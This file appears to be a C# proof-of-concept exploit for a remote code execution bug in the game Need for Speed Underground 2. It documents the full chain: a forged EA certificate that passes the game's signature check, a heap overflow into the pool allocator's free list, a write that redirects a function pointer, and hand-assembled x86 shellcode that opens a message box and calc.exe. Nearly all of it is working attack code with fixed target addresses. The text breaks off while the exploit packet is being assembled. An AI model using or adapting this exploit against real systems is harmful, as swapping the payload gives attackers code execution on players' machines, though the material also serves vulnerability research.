// ============================================================================
//  NFS Underground 2 (SPEED2.EXE) — Pure Network RCE Proof of Concept v3
// ============================================================================
//
//  VULNERABILITY: Unbounded memcpy in the TLS certificate handler (state 0xb)
//  combined with a custom pool allocator that has no integrity checks.
//
//  TARGET:  SPEED2.EXE (32-bit x86, no ASLR, no DEP, no SafeSEH)
//           SHA-256: 8f6a9ae2c4cfa01181d2fd755d99c6f4b7103f60273908ea1de1e719dfe2a297
//
//  ATTACK VECTOR: Single TCP packet on port 20971 (game's online auth port)
//
//  PREREQUISITES:
//    - pcnfs05.ea.com must resolve to the attacker's IP (e.g. hosts file → 127.0.0.1)
//    - Game navigates to Online → Use Existing to initiate the connection
//
//  EXPLOIT CHAIN (all steps execute inside the game's own code):
//
//    1. CERTIFICATE DELIVERY
//       Game connects to port 20971 and sends a 30-byte handshake.
//       We reply with a single packet containing a crafted X.509 certificate.
//
//    2. CA VALIDATION BYPASS
//       The cert's issuer DN matches the EA root CA ("Electronic Arts, Inc.",
//       "OTG3 Certificate Authority"), so the issuer check passes.
//
//    3. SIGNATURE VERIFICATION BYPASS
//       The cert uses OID 1.2.840.113549.1.1.1 (rsaEncryption).
//       The game's OID table maps this to type 7. The comparison logic computes:
//         type - 8  = -1 (not 0, skip first branch)
//         -1 - 1    = -2 (not 0, skip second branch)
//       → ESI = 0 → CMPSB with ECX=0 → compares zero bytes → always succeeds.
//
//    4. UNBOUNDED COPY (the vulnerability)
//       After cert validation, the handler copies attacker-controlled data
//       starting at KE+0x81D4 with no bounds check. The KE buffer is only
//       0x88C0 bytes, so we overflow into the adjacent pool free-list node.
//
//    5. POOL FREE-LIST CORRUPTION
//       The overflow overwrites the free node's pointers:
//         next → PTR_FUN - 4    (0x007FBE50)
//         prev → fakePrevAddr   (address of our shellcode, past the fill zone)
//         size → original value (keeps the merge conditions correct)
//         magic → 0x44443333    (valid free-list magic)
//
//    6. FAKE PREV NODE WITH SHELLCODE
//       32 bytes past the free node, we write a second fake node containing:
//         [0-3]   Clobber zone (overwritten during INSERT, becomes PUSH EAX; MOV ESI,imm32)
//         [4-5]   NOP NOP (consumed by MOV ESI's immediate operand)
//         [6-7]   JMP SHORT +4 (skips the size field at bytes 8-11)
//         [8-11]  Backward coalesce trigger size (modified during merge, skipped by JMP)
//         [12+]   Position-independent x86 shellcode
//
//    7. TCP CLOSE → KE FREE → DWORD SHOOT
//       Closing the TCP connection causes the game to free the KE buffer.
//       The pool allocator (FUN_0043fa50) runs its free-list maintenance:
//
//       a) SORTED INSERT: walks the list, inserts KE before the corrupted node.
//          Reads corrupted.prev (= fakePrevAddr). Writes *(fakePrevAddr) = KE_block.
//          This clobbers bytes 0-3 of our fake prev node (we handle it with the bridge).
//
//       b) FORWARD COALESCE: KE_end == corrupted_node (adjacent blocks), so it merges.
//          Unlinks the corrupted node. Writes *(next+4) = prev → *(PTR_FUN) = KE_block.
//          This is a temporary value — the next step overwrites it.
//
//       c) BACKWARD COALESCE: fakePrev.size + fakePrevAddr == KE_block (32-bit wrap).
//          The allocator thinks fakePrev and KE are adjacent. Merges them.
//          Writes *(PTR_FUN) = fakePrevAddr  ← THIS IS THE DWORD SHOOT
//          PTR_FUN now points to our shellcode.
//
//       d) DEBUG FILL: fills [KE_block, freeNode+16) with 0xEEEEEEEE.
//          Our shellcode at freeNode+32 is OUTSIDE this range → survives.
//
//    8. CODE EXECUTION
//       The next pool allocation calls through PTR_FUN (a function pointer at
//       0x007FBE54 in the .data section). JMP [PTR_FUN] → fakePrevAddr →
//       bridge code → shellcode → MessageBoxA("PWNED") + ShellExecuteA("calc.exe").
//       The shellcode restores PTR_FUN to its original value so the game can continue.
//
//  DEMO PAYLOAD: MessageBox + calc.exe (harmless proof of execution)
//
//  RESULT: Arbitrary code execution from a single network packet. The game's own
//  code handles every step — the attacker only sends bytes over TCP.
//
// ============================================================================

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class NFSU2NetworkRCEv3
{
    // ========================================================================
    //  Win32 API — ReadProcessMemory for address discovery and diagnostics only.
    //  The exploit itself is the TCP packet; these calls don't modify the game.
    // ========================================================================

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, int size, out int read);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr proc, IntPtr addr, out MEMORY_BASIC_INFO info, int len);

    [StructLayout(LayoutKind.Sequential)]
    struct MEMORY_BASIC_INFO {
        public IntPtr BaseAddress, AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State, Protect, Type;
    }

    // ========================================================================
    //  Target addresses (SPEED2.EXE, fixed base 0x400000, no ASLR)
    // ========================================================================

    // Writable .data section function pointer — the DWORD shoot target.
    // Pool allocator calls through this: JMP [PTR_FUN]
    const uint PTR_FUN       = 0x007FBE54;

    // Original value of PTR_FUN (pool allocator entry point FUN_005832E0).
    // Shellcode restores this after executing so the game keeps running.
    const uint PTR_FUN_ORIG  = 0x005832E0;

    // Pointer to the pool descriptor structure. At runtime, *(POOL_DESC_PTR)+4
    // gives the free-list sentinel node address.
    const uint POOL_DESC_PTR = 0x00828154;

    // IAT entries for shellcode API calls (game already imports these)
    const uint IAT_MSGBOX    = 0x00783318;   // MessageBoxA
    const uint IAT_SHELLEXEC = 0x007832D4;   // ShellExecuteA

    // Pool allocator free-list magic value (marks a node as free)
    const uint FMAGIC        = 0x44443333;

    // Offset within the KE buffer where the unbounded copy destination starts.
    // The copy writes attacker data from KE+0x81D4 onward with no size check.
    const int  COPY_DEST_OFF = 0x81D4;

    // ========================================================================
    //  Globals
    // ========================================================================

    static IntPtr hProc;       // Handle to SPEED2.EXE process (read-only)
    static string logFile;     // Path to rce_v3_log.txt alongside the exe

    // ========================================================================
    //  Helpers
    // ========================================================================

    // Timestamped logging to console and file
    static void Log(string msg) {
        string line = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + msg;
        Console.WriteLine(line);
        try { File.AppendAllText(logFile, line + "\r\n"); } catch {}
    }

    // Read bytes from game memory
    static byte[] Rd(IntPtr addr, int size) {
        byte[] buf = new byte[size]; int read;
        ReadProcessMemory(hProc, addr, buf, size, out read);
        return buf;
    }

    // Read a 32-bit value from game memory
    static uint Rd32(uint addr) {
        return BitConverter.ToUInt32(Rd((IntPtr)addr, 4), 0);
    }

    // ========================================================================
    //  FindKE — Locate the Key Exchange buffer in game memory
    // ========================================================================
    //
    // The KE buffer is a 0x88C0-byte heap allocation that holds the TLS
    // handshake state. We find it by scanning for the handshake data the
    // game stored there (the first 20 bytes the game sent us).
    //
    // Returns the KE data pointer (start of the 0x88C0 user data area).

    static uint FindKE(byte[] signature) {
        var matches = new List<uint>();
        uint addr = 0x00100000;

        // Walk committed memory regions looking for the handshake signature
        while (addr < 0x7FFF0000) {
            MEMORY_BASIC_INFO mbi;
            int result = VirtualQueryEx(hProc, (IntPtr)addr, out mbi, Marshal.SizeOf(typeof(MEMORY_BASIC_INFO)));
            if (result == 0) break;

            uint regionBase = (uint)mbi.BaseAddress;
            uint regionSize = (uint)mbi.RegionSize;

            // Only scan committed, readable regions
            if (mbi.State == 0x1000 && (mbi.Protect & 0xFE) != 0) {
                for (uint offset = 0; offset < regionSize; offset += 0x10000) {
                    int toRead = (int)Math.Min(0x10000 + signature.Length, regionSize - offset);
                    if (toRead < signature.Length) break;

                    byte[] buf = new byte[toRead]; int bytesRead;
                    ReadProcessMemory(hProc, (IntPtr)(regionBase + offset), buf, toRead, out bytesRead);

                    for (int i = 0; i <= bytesRead - signature.Length; i++) {
                        bool match = true;
                        for (int j = 0; j < signature.Length; j++)
                            if (buf[i + j] != signature[j]) { match = false; break; }
                        if (match) {
                            matches.Add(regionBase + offset + (uint)i);
                            i += 0x8000; // skip ahead to avoid duplicate hits
                        }
                    }
                }
            }
            addr = regionBase + regionSize;
            if (addr <= regionBase) break;
        }

        Log("FindKE: " + matches.Count + " match(es) for " + signature.Length + "-byte sig");

        // Validate each match: check for pool block header with magic 0x22
        uint bestKE = 0;
        foreach (uint matchAddr in matches) {
            byte[] pre = Rd((IntPtr)(matchAddr - 48), 64);
            bool found = false;

            for (uint back = 0; back < 40; back++) {
                int magicIdx = (int)(37 - back);
                if (magicIdx < 0 || magicIdx >= 64) continue;
                if (pre[magicIdx] != 0x22) continue; // pool block magic byte

                int sizeIdx = (int)(44 - back);
                if (sizeIdx < 0 || sizeIdx + 4 > 64) continue;
                uint size = BitConverter.ToUInt32(pre, sizeIdx);
                if (size < 0x8000 || size > 0x100000) continue; // reasonable alloc size

                uint testKE = matchAddr - back;
                uint crypto = Rd32(testKE + 0x80A8);
                bool isFreed = Rd32(testKE - 8) == FMAGIC;

                Log("  @0x" + matchAddr.ToString("X8") + " back=" + back +
                    " -> KE=0x" + testKE.ToString("X8") +
                    " allocSz=0x" + size.ToString("X") +
                    " crypto=0x" + crypto.ToString("X8") +
                    (isFreed ? " FREED" : " alloc") +
                    (crypto == 0 && !isFreed ? " <<VALID>>" : ""));

                // Best candidate: not freed, crypto flag not yet set (pre-exploit state)
                if (crypto == 0 && !isFreed) bestKE = testKE;
                found = true;
                break;
            }
            if (!found)
                Log("  @0x" + matchAddr.ToString("X8") + " -- no pool header (not KE)");
        }
        return bestKE;
    }

    // ========================================================================
    //  FindFreeNodeAfterKE — Walk the pool free list for the adjacent node
    // ========================================================================
    //
    // The pool allocator maintains a circular doubly-linked sorted free list.
    // We need the free node immediately after the KE allocation, because:
    //   1. The unbounded copy overflows into it
    //   2. When KE is freed, forward coalesce merges KE + this node
    //
    // Node layout: [next:4][prev:4][size:4][magic:4] = 16 bytes header

    static uint FindFreeNodeAfterKE(uint ke) {
        uint sentinel = Rd32(POOL_DESC_PTR) + 4;
        uint node = Rd32(sentinel);
        uint copyDest = ke + COPY_DEST_OFF;
        int count = 0;

        while (node != sentinel && count < 200) {
            uint nodeSize  = Rd32(node + 8);
            uint nodeMagic = Rd32(node + 12);

            if (nodeMagic == FMAGIC && node > copyDest) {
                Log("  Target free node at 0x" + node.ToString("X8") +
                    " size=0x" + nodeSize.ToString("X") +
                    " dist=" + (node - copyDest) + " bytes from copy dest");
                return node;
            }
            node = Rd32(node);
            count++;
        }
        return 0;
    }

    // ========================================================================
    //  ASN.1 DER Encoding — Build the fake X.509 certificate
    // ========================================================================

    static byte[] Asn1Tag(byte tag, byte[] content) {
        var ms = new MemoryStream();
        ms.WriteByte(tag);
        if (content.Length < 0x80) {
            ms.WriteByte((byte)content.Length);
        } else if (content.Length < 0x100) {
            ms.WriteByte(0x81);
            ms.WriteByte((byte)content.Length);
        } else {
            ms.WriteByte(0x82);
            ms.WriteByte((byte)(content.Length >> 8));
            ms.WriteByte((byte)(content.Length & 0xFF));
        }
        ms.Write(content, 0, content.Length);
        return ms.ToArray();
    }

    static byte[] Asn1Seq(params byte[][] items) {
        var ms = new MemoryStream();
        foreach (var it in items) ms.Write(it, 0, it.Length);
        return Asn1Tag(0x30, ms.ToArray());
    }

    static byte[] Asn1Set(params byte[][] items) {
        var ms = new MemoryStream();
        foreach (var it in items) ms.Write(it, 0, it.Length);
        return Asn1Tag(0x31, ms.ToArray());
    }

    static byte[] Asn1Oid(byte[] oid)   { return Asn1Tag(0x06, oid); }
    static byte[] Asn1Str(string s)     { return Asn1Tag(0x13, Encoding.ASCII.GetBytes(s)); }
    static byte[] Asn1Utc(string s)     { return Asn1Tag(0x17, Encoding.ASCII.GetBytes(s)); }
    static byte[] Asn1Int(byte[] val)   { return Asn1Tag(0x02, val); }

    static byte[] Asn1Bits(byte[] val) {
        byte[] content = new byte[val.Length + 1];
        content[0] = 0x00; // no unused bits
        Array.Copy(val, 0, content, 1, val.Length);
        return Asn1Tag(0x03, content);
    }

    static byte[] Asn1RdnAttr(byte[] oid, string val) {
        return Asn1Set(Asn1Seq(Asn1Oid(oid), Asn1Str(val)));
    }

    // X.500 Distinguished Name OIDs
    static readonly byte[] OID_CN  = {0x55, 0x04, 0x03}; // commonName
    static readonly byte[] OID_C   = {0x55, 0x04, 0x06}; // countryName
    static readonly byte[] OID_L   = {0x55, 0x04, 0x07}; // localityName
    static readonly byte[] OID_ST  = {0x55, 0x04, 0x08}; // stateOrProvinceName
    static readonly byte[] OID_O   = {0x55, 0x04, 0x0A}; // organizationName
    static readonly byte[] OID_OU  = {0x55, 0x04, 0x0B}; // organizationalUnitName

    // PKCS#1 algorithm OIDs
    static readonly byte[] OID_RSA = {0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01}; // rsaEncryption
    static readonly byte[] OID_UNK = {0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x06}; // oaepPSS (unused)

    // Build a fake X.509 certificate that passes the game's CA and signature checks.
    // The issuer DN matches EA's hardcoded root CA. The rsaEncryption OID triggers
    // the signature bypass (type 7 → CMPSB compares 0 bytes → always passes).
    static byte[] BuildASN1Certificate() {
        byte[] issuer = Asn1Seq(
            Asn1RdnAttr(OID_C,  "US"),
            Asn1RdnAttr(OID_ST, "California"),
            Asn1RdnAttr(OID_L,  "Redwood City"),
            Asn1RdnAttr(OID_O,  "Electronic Arts, Inc."),
            Asn1RdnAttr(OID_CN, "OTG3 Certificate Authority")
        );
        byte[] subject = Asn1Seq(
            Asn1RdnAttr(OID_C,  "US"),
            Asn1RdnAttr(OID_ST, "California"),
            Asn1RdnAttr(OID_L,  "Redwood City"),
            Asn1RdnAttr(OID_O,  "Electronic Arts, Inc."),
            Asn1RdnAttr(OID_OU, "Online Technology Group"),
            Asn1RdnAttr(OID_CN, "pcnfs05.ea.com")
        );
        byte[] validity = Asn1Seq(Asn1Utc("241001000000Z"), Asn1Utc("271001000000Z"));
        byte[] serial   = Asn1Int(new byte[] {0x01});
        byte[] algoId   = Asn1Seq(Asn1Oid(OID_RSA));

        byte[] fakeKey = new byte[128];
        fakeKey[0] = 0x01;
        byte[] pubKeyInfo = Asn1Seq(Asn1Seq(Asn1Oid(OID_UNK)), Asn1Bits(fakeKey));

        byte[] tbs = Asn1Seq(serial, algoId, issuer, validity, subject, pubKeyInfo);
        byte[] outerAlgoId = Asn1Seq(Asn1Oid(OID_RSA));
        byte[] fakeSig = new byte[128];

        return Asn1Seq(tbs, outerAlgoId, Asn1Bits(fakeSig));
    }

    // ========================================================================
    //  Shellcode — Position-independent x86 (105 bytes)
    // ========================================================================
    //
    // Placed at fakePrev+12 (after the 12-byte bridge header).
    // On entry the bridge has executed: PUSH EAX, MOV ESI (junk), JMP over size.
    //
    // Actions:
    //   1. CALL/POP to get EIP (position-independent string references)
    //   2. Restore PTR_FUN to original value (game keeps running)
    //   3. POP EAX to balance the PUSH from the bridge
    //   4. MessageBoxA(0, "NFS Underground 2 RCE!", "PWNED", MB_ICONINFORMATION)
    //   5. ShellExecuteA(0, "open", "calc.exe", 0, 0, SW_SHOW)
    //   6. XOR EAX,EAX / RET (clean return, alloc caller handles NULL)

    static byte[] BuildRealShellcode() {
        var sc = new MemoryStream();
        var w = new BinaryWriter(sc);

        // CALL $+5 / POP EBX → EBX = address of byte 5 (for relative addressing)
        w.Write((byte)0xE8); w.Write((uint)0x00000000); // CALL $+5
        w.Write((byte)0x5B);                             // POP EBX

        // Restore PTR_FUN so the game doesn't crash after our code runs
        // MOV DWORD PTR [0x007FBE54], 0x005832E0
        w.Write((byte)0xC7); w.Write((byte)0x05);
        w.Write(PTR_FUN);
        w.Write(PTR_FUN_ORIG);

        // Balance the PUSH EAX from the bridge (byte 0 of fake prev after clobber)
        w.Write((byte)0x58);                             // POP EAX

        // ---- MessageBoxA(0, text, caption, MB_ICONINFORMATION) ----
        // Strings at known offsets from EBX:
        //   "PWNED\0"                  @ sc[62], offset from EBX = 57 (0x39)
        //   "NFS Underground 2 RCE!\0" @ sc[68], offset from EBX = 63 (0x3F)
        w.Write((byte)0x6A); w.Write((byte)0x40);       // PUSH 0x40 (MB_ICONINFORMATION)
        w.Write((byte)0x8D); w.Write((byte)0x43);       // LEA EAX, [EBX+0x39]
        w.Write((byte)0x39);
        w.Write((byte)0x50);                             // PUSH EAX  (lpCaption = "PWNED")
        w.Write((byte)0x8D); w.Write((byte)0x43);       // LEA EAX, [EBX+0x3F]
        w.Write((byte)0x3F);
        w.Write((byte)0x50);                             // PUSH EAX  (lpText = "NFS Underground 2 RCE!")
        w.Write((byte)0x6A); w.Write((byte)0x00);       // PUSH 0    (hWnd = NULL)
        w.Write((byte)0xA1); w.Write(IAT_MSGBOX);       // MOV EAX, [0x00783318]  (MessageBoxA IAT)
        w.Write((byte)0xFF); w.Write((byte)0xD0);       // CALL EAX

        // ---- ShellExecuteA(0, "open", "calc.exe", 0, 0, SW_SHOW) ----
        // Strings:
        //   "calc.exe\0" @ sc[91], offset from EBX = 86 (0x56)
        //   "open\0"     @ sc[100], offset from EBX = 95 (0x5F)
        w.Write((byte)0x6A); w.Write((byte)0x05);       // PUSH 5    (SW_SHOW)
        w.Write((byte)0x6A); w.Write((byte)0x00);       // PUSH 0    (lpDirectory)
        w.Write((byte)0x6A); w.Write((byte)0x00);       // PUSH 0    (lpParameters)
        w.Write((byte)0x8D); w.Write((byte)0x43);       // LEA EAX, [EBX+0x56]
        w.Write((byte)0x56);
        w.Write((byte)0x50);                             // PUSH EAX  (lpFile = "calc.exe")
        w.Write((byte)0x8D); w.Write((byte)0x43);       // LEA EAX, [EBX+0x5F]
        w.Write((byte)0x5F);
        w.Write((byte)0x50);                             // PUSH EAX  (lpOperation = "open")
        w.Write((byte)0x6A); w.Write((byte)0x00);       // PUSH 0    (hwnd)
        w.Write((byte)0xA1); w.Write(IAT_SHELLEXEC);    // MOV EAX, [0x007832D4]  (ShellExecuteA IAT)
        w.Write((byte)0xFF); w.Write((byte)0xD0);       // CALL EAX

        // Clean return
        w.Write((byte)0x33); w.Write((byte)0xC0);       // XOR EAX, EAX
        w.Write((byte)0xC3);                             // RET

        // String data (offsets must match the LEA instructions above)
        w.Write(Encoding.ASCII.GetBytes("PWNED\0"));                    // @62
        w.Write(Encoding.ASCII.GetBytes("NFS Underground 2 RCE!\0"));   // @68
        w.Write(Encoding.ASCII.GetBytes("calc.exe\0"));                 // @91
        w.Write(Encoding.ASCII.GetBytes("open\0"));                     // @100

        return sc.ToArray(); // 105 bytes total
    }

    // ========================================================================
    //  Entry Point
    // ========================================================================

    static void Main() {
        logFile = Path.Combine(Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location), "rce_v3_log.txt");
        try { File.Delete(logFile); } catch {}

        Console.WriteLine();
        Console.WriteLine("  NFS Underground 2 -- Pure Network RCE PoC v3");
        Console.WriteLine("  =============================================");
        Console.WriteLine("  Exploit: unbounded copy -> backward coalesce DWORD shoot");
        Console.WriteLine("  Shellcode survives 0xEE debug fill. Single TCP packet.");
        Console.WriteLine();

        try { Run(); } catch (Exception ex) { Log("FATAL: " + ex.Message); }

        Console.WriteLine();
        Console.WriteLine("  Press Enter to close...");
        Console.ReadLine();
    }

    // ========================================================================
    //  Run — Main exploit logic
    // ========================================================================

    static void Run() {

        // Flush DNS so pcnfs05.ea.com → 127.0.0.1 takes effect immediately
        try {
            Process.Start(new ProcessStartInfo("ipconfig", "/flushdns") {
                CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true
            }).WaitForExit(3000);
        } catch {}

        // ----------------------------------------------------------------
        // STEP 1: Start listening for the game's connection
        // ----------------------------------------------------------------
        TcpListener server;
        try {
            server = new TcpListener(IPAddress.Loopback, 20971);
            server.Start();
        } catch {
            Log("Port 20971 in use. Close any other instance and retry.");
            return;
        }

        Log("Listening on 20971...");
        Console.WriteLine("  Launch the game, go to Online -> Use Existing.");
        Console.WriteLine("  Waiting for connection...");
        Console.WriteLine();

        // Wait up to 10 minutes for the game to connect
        var acceptTask = server.AcceptTcpClientAsync();
        if (!acceptTask.Wait(600000)) {
            Log("Timeout (10 min). No connection received.");
            server.Stop();
            return;
        }

        var client = acceptTask.Result;
        var stream = client.GetStream();
        stream.ReadTimeout = 10000;
        Log("Game connected");

        // ----------------------------------------------------------------
        // STEP 2: Attach to game process (read-only, for address discovery)
        // ----------------------------------------------------------------
        var procs = Process.GetProcessesByName("SPEED2");
        if (procs.Length == 0) {
            Log("FAIL: game connected but SPEED2 process not found");
            client.Close(); server.Stop();
            return;
        }
        hProc = OpenProcess(0x1F0FFF, false, procs[0].Id);
        Log("Game PID " + procs[0].Id);

        // ----------------------------------------------------------------
        // STEP 3: Receive the game's handshake
        // ----------------------------------------------------------------
        byte[] inBuf = new byte[4096];
        int totalRead = 0;
        stream.ReadTimeout = 15000;
        try {
            int n = stream.Read(inBuf, 0, inBuf.Length);
            if (n > 0) totalRead = n;
            stream.ReadTimeout = 2000;
            for (int attempt = 0; attempt < 30; attempt++) {
                Thread.Sleep(300);
                if (stream.DataAvailable) {
                    n = stream.Read(inBuf, totalRead, inBuf.Length - totalRead);
                    if (n > 0) totalRead += n;
                } else if (totalRead > 0) {
                    break;
                }
            }
        } catch (Exception ex) {
            if (totalRead == 0) Log("Read exception: " + ex.Message);
        }

        Log("Handshake: " + totalRead + " bytes");
        if (totalRead < 8) {
            Log("FAIL: handshake too short");
            client.Close(); server.Stop();
            return;
        }

        // ----------------------------------------------------------------
        // STEP 4: Find the KE buffer in game memory
        // ----------------------------------------------------------------
        // Use the handshake data as a signature to locate the KE buffer.
        // The game stores the handshake at the start of the KE allocation.
        byte[] signature = new byte[Math.Min(totalRead, 20)];
        Array.Copy(inBuf, 0, signature, 0, signature.Length);
        Log("Scanning for KE (sig: " + BitConverter.ToString(signature, 0, Math.Min(8, signature.Length)) + "...)");

        Thread.Sleep(500); // let the game finish storing the handshake
        uint ke = 0;
        for (int retry = 0; retry < 5 && ke == 0; retry++) {
            if (retry > 0) Thread.Sleep(1000);
            ke = FindKE(signature);
        }
        if (ke == 0) {
            Log("FAIL: KE not found after 5 attempts");
            client.Close(); server.Stop();
            return;
        }
        Log("KE at 0x" + ke.ToString("X8"));

        uint currentPtrFun = Rd32(PTR_FUN);
        Log("PTR_FUN = 0x" + currentPtrFun.ToString("X8") +
            (currentPtrFun == PTR_FUN_ORIG ? " (original)" : " (CHANGED!)"));

        // ----------------------------------------------------------------
        // STEP 5: Find the adjacent free-list node (overflow target)
        // ----------------------------------------------------------------
        uint freeNode = FindFreeNodeAfterKE(ke);
        if (freeNode == 0) {
            Log("FAIL: no free node found after KE");
            client.Close(); server.Stop();
            return;
        }

        uint copyDest    = ke + COPY_DEST_OFF;
        uint distToNode  = freeNode - copyDest;
        uint origSize    = Rd32(freeNode + 8);

        Log("Copy dest: 0x" + copyDest.ToString("X8"));
        Log("Free node: 0x" + freeNode.ToString("X8") +
            " (dist=" + distToNode + ", origSize=0x" + origSize.ToString("X") + ")");

        // ----------------------------------------------------------------
        // STEP 6: Calculate block boundaries for coalesce conditions
        // ----------------------------------------------------------------
        // Pool block layout: [20-byte header][name area][user data]
        // Block start = KE_data_ptr - (20 + name_area_length)
        short nameLen = BitConverter.ToInt16(Rd((IntPtr)(ke - 10), 2), 0);
        uint overhead = (uint)(20 + nameLen);
        uint keBlock  = ke - overhead;
        Log("KE block: 0x" + keBlock.ToString("X8") + " (overhead=0x" + overhead.ToString("X") + ")");

        // Verify adjacency: KE block end must equal freeNode for forward coalesce
        uint totalBlockSize = overhead + 0x88C0;
        uint keEnd = keBlock + totalBlockSize;
        Log("KE end: 0x" + keEnd.ToString("X8") +
            (keEnd == freeNode ? " == freeNode (adjacent -- forward coalesce WILL trigger)" :
             " != freeNode 0x" + freeNode.ToString("X8") + " (NOT adjacent!)"));

        if (keEnd != freeNode) {
            Log("WARNING: KE block not adjacent. Trying alloc size from header...");
            uint allocSz = Rd32(ke - 4);
            totalBlockSize = overhead + allocSz;
            keEnd = keBlock + totalBlockSize;
            Log("  allocSz=0x" + allocSz.ToString("X") + " keEnd=0x" + keEnd.ToString("X8") +
                (keEnd == freeNode ? " == freeNode (OK!)" : " (still not adjacent)"));
            if (keEnd != freeNode) {
                Log("FAIL: cannot determine correct block boundary");
                client.Close(); server.Stop();
                return;
            }
        }

        // ----------------------------------------------------------------
        // STEP 7: Build the exploit payload
        // ----------------------------------------------------------------

        // Place fake prev node 32 bytes past freeNode.
        // The 0xEE debug fill covers [keBlock, freeNode+16).
        // At freeNode+32, our shellcode is safely outside the fill range.
        const uint FAKE_PREV_GAP = 32;
        uint fakePrevAddr = freeNode + FAKE_PREV_GAP;

        // Backward coalesce condition: fakePrev + fakePrev.size == keBlock
        // Solve: fakeBackSize = keBlock - fakePrevAddr (wraps in 32 bits)
        uint fakeBackSize = unchecked(keBlock - fakePrevAddr);

        byte[] shellcode = BuildRealShellcode();
        Log("Shellcode: " + shellcode.Length + " bytes (position-independent)");
        Log("Fake prev: 0x" + fakePrevAddr.ToString("X8") + " (freeNode+" + FAKE_PREV_GAP + ")");
        Log("  Backward coalesce size: 0x" + fakeBackSize.ToString("X8"));
        Log("  Verify: 0x" + fakePrevAddr.ToString("X8") + " + 0x" + fakeBackSize.ToString("X8") +
            " = 0x" + unchecked(fakePrevAddr + fakeBackSize).ToString("X8") +
            (unchecked(fakePrevAddr + fakeBackSize) == keBlock ? " OK" : " MISMATCH!"));

        // Build the ASN.1 certificate
        byte[] asn1Cert = BuildASN1Certificate();
        Log("ASN.1 cert: " + asn1Cert.Length + " bytes");

        // Build the copy overflow data
        uint fakePrevDist = fakePrevAddr - copyDest;
        uint copyLen = fakePrevDist + 12 + (uint)shellcode.Length;
        byte[] copyData = new byte[copyLen];

        // Preserve the pool block header right before the free node (prevents early crash)
        uint hdrAddr  = freeNode - 0x14;
        int  hdrOff   = (int)(hdrAddr - copyDest);
        if (hdrOff >= 0 && hdrOff + 0x14 <= (int)copyLen) {
            byte[] origHdr = Rd((IntPtr)hdrAddr, 0x14);
            Array.Copy(origHdr, 0, copyData, hdrOff, 0x14);
            Log("Preserved pool header at offset " + hdrOff);
        }

        // Write the corrupted free-list node
        int nodeOff  = (int)distToNode;
        uint fakeNext = PTR_FUN - 4; // 0x007FBE50 — forward coalesce writes *(next+4) = prev

        BitConverter.GetBytes(fakeNext).CopyTo(copyData, nodeOff);          // next → PTR_FUN-4
        BitConverter.GetBytes(fakePrevAddr).CopyTo(copyData, nodeOff + 4);  // prev → fake prev node
        BitConverter.GetBytes(origSize).CopyTo(copyData, nodeOff + 8);      // size (unchanged)
        BitConverter.GetBytes(FMAGIC).CopyTo(copyData, nodeOff + 12);       // magic 0x44443333

        Log("Fake node @ offset " + nodeOff + ": next=0x" + fakeNext.ToString("X8") +
            " prev=0x" + fakePrevAddr.ToString("X8") +
            " size=0x" + origSize.ToString("X") + " magic=0x44443333");

        // Write the fake prev node (bridge header + shellcode)
        int fpOff = (int)fakePrevDist;

        // Bytes [0-3]: Will be clobbered by INSERT (writes KE_block addr here).
        // After backward coalesce, these become: 50 BE 7F 00
        //   50       = PUSH EAX
        //   BE xx xx = MOV ESI, imm32 (consumes bytes 1-5 as the immediate)
        // This is harmless: ESI gets junk, EAX is saved on stack.
        copyData[fpOff + 0] = 0xCC; copyData[fpOff + 1] = 0xCC;
        copyData[fpOff + 2] = 0xCC; copyData[fpOff + 3] = 0xCC;

        // Bytes [4-5]: Consumed by MOV ESI's 4-byte immediate operand
        copyData[fpOff + 4] = 0x90; // NOP (part of imm32)
        copyData[fpOff + 5] = 0x90; // NOP (part of imm32)

        // Bytes [6-7]: JMP SHORT +4 — skip over the size field (bytes 8-11)
        copyData[fpOff + 6] = 0xEB; // JMP SHORT
        copyData[fpOff + 7] = 0x04; // +4 bytes

        // Bytes [8-11]: Backward coalesce trigger size (gets modified during merge, skipped by JMP)
        BitConverter.GetBytes(fakeBackSize).CopyTo(copyData, fpOff + 8);

        // Bytes [12+]: The real shellcode (landed on after the JMP skips bytes 8-11)
        Array.Copy(shellcode, 0, copyData, fpOff + 12, shellcode.Length);

        Log("Fake prev @ offset " + fpOff + ": bridge + shellcode (" + (12 + shellcode.Length) + " bytes)");
        Log("Total copy data: " + copyLen + " bytes");

        // ----------------------------------------------------------------
        // STEP 8: Assemble and send the exploit packet
        // ----------------------------------------------------------------
        int asn1Len    = asn1Cert.Length;
        int copyOffset = 3; // packet structure offset for copy data
        int payloadLen = 11 + asn1Len + 3 + (int)copyLen;
        int totalLen   = 2 + payloadLen;

        if (totalLen > 32769) {
            Log("FAIL: packet too large (" + totalLen + " > 32769)");
            client.Close(); server.Stop();
            return;
        }

        byte[] packet = new byte[totalLen];

        // Packet header (2 bytes: length with high bit set)
        int hdrVal = totalLen - 2;
        packet[0] = (byte)(((hdrVal >> 8) & 0x7F) | 0x80);
        packet[1] = (byte)(hdrVal & 0xFF);

        // Payload header
        int p = 2;
        packet[p++] = 0; packet[p++] = 0; packet[p++] = 0; packet[p++] = 0; packet[p++] = 0;
        packet[p++] = (byte)((asn1Len >> 8) & 0xFF);
        packet[p++] = (byte)(asn1Len & 0xFF);
        packet[p++] = (byte)((copyOffset >> 8) & 0xFF);
        packet[p++] = (byte)(copyOffset & 0xFF);
        packet[p++] = (byte)(((int)copyLen >> 8) & 0xFF);
        packet[p++] = (byte)((int)copyLen & 0xFF);

        // Certificate data
        Array.Copy(asn1Cert, 0, packet, p, asn1Len);
        p += asn1Len;

        // Copy trigger bytes
        packet[p++] = 0x00; packet[p++] = 0x01; packet[p++] = 0x00;

        // Overflow payload (overwrites free node + plants shellcode)
